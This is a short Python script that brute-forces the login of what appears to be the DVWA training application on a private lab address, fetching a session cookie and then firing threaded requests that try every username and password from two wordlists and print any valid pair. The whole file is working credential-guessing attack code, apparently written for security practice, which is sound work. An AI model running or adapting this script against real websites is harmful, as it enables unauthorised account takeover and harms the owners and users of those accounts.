import requests
import regex as re
import _thread
import time
import sys
from termcolor import colored, cprint



url = "10.10.30.197"
port = "80"
userlist = "./usernames.txt"
passwordlist = "./passlist.txt"
error_message = "Username and/or password incorrect."
timeout = 3

lock = _thread.allocate_lock()

def get_session():
    # Get session id from the login page
    r = requests.get("http://{}:{}/login.php".format(url, port))
    phpsessid = re.findall("PHPSESSID=(.*);", r.headers['Set-Cookie'])
    phpsessid = phpsessid[0].split(';')[0]
    difficulty = re.findall("security=(.*);", r.headers['Set-Cookie'])
    difficulty = difficulty[0]

    # Get user_token value from the login page
    token = re.findall("'user_token' value='(.*)'", r.text)[0]

    # Validate the session
    r = requests.post("http://{}:{}/login.php".format(url, port),
                      cookies={'PHPSESSID': phpsessid, 'security': difficulty},
                      data='username=admin&password=password&Login=Login&user_token={}'.format(token),
                      headers={'Content-Type': 'application/x-www-form-urlencoded'})
    return phpsessid, difficulty


def try_credentials(url, port, username, password, phpsessid):
    lock.acquire()
    sys.stdout.write("\rTry: user={} & password={}".format(username, password))
    lock.release()
    r = requests.get("http://{}:{}/vulnerabilities/brute/?username={}&password={}&Login=Login".format(url, port, username, password),
                     cookies={'PHPSESSID': phpsessid, 'security': "low"})
    if error_message in r.text:
        return;
    lock.acquire()
    cprint("\nFOUND: user={} & password={}".format(username, password), 'green')
    lock.release()


def main():
    phpsessid, difficulty = get_session()
    for user in open(userlist, 'r'):
        for password in open(passwordlist, 'r'):
            USER, PASSWORD = user.replace("\n", ''), password.replace("\n", '')
            _thread.start_new_thread(try_credentials, (url, port, USER, PASSWORD, phpsessid))

    time.sleep(timeout)


if __name__ == "__main__":
    main()
